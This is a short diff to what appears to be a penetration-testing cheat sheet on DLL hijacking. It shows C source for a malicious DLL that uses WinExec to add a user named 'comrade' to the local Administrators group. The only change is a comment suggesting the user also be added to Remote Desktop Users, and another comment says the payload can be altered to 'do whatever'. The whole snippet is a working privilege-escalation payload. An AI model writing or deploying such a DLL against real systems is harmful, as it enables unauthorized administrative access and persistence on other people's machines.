@@ -449,7 +449,7 @@ run the process		# and observe "NAME NOT FOUND" .dll's
 #include <windows.h>
 int execCommand()
 {
- WinExec("cmd /C net localgroup \"Administrators\" /add comrade", 1);		// makes user comrade an admin, can change code to do whatever
+ WinExec("cmd /C net localgroup \"Administrators\" /add comrade", 1);		// makes user comrade an admin, can change code to do whatever, may need to add to "Remote Desktop User"
  return 0;
 }
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
